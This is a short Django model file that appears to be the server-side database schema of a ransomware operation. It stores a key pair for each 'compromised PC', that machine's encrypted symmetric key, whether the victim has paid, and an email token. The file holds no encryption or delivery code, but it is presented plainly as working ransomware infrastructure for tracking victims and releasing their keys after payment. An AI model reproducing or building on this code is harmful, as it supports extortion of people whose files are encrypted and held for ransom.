from django.db import models

class Keys(models.Model):
    private_key = models.BinaryField()
    public_key = models.BinaryField()
    uuid_compromised_pc = models.UUIDField()
    encrypted_symetric_key = models.BinaryField(blank=True)
    paid_status=models.BooleanField(default=False)
    unique_email_token=models.CharField(max_length=200, blank=True)
    
    def __str__(self):
        return str(self.uuid_compromised_pc)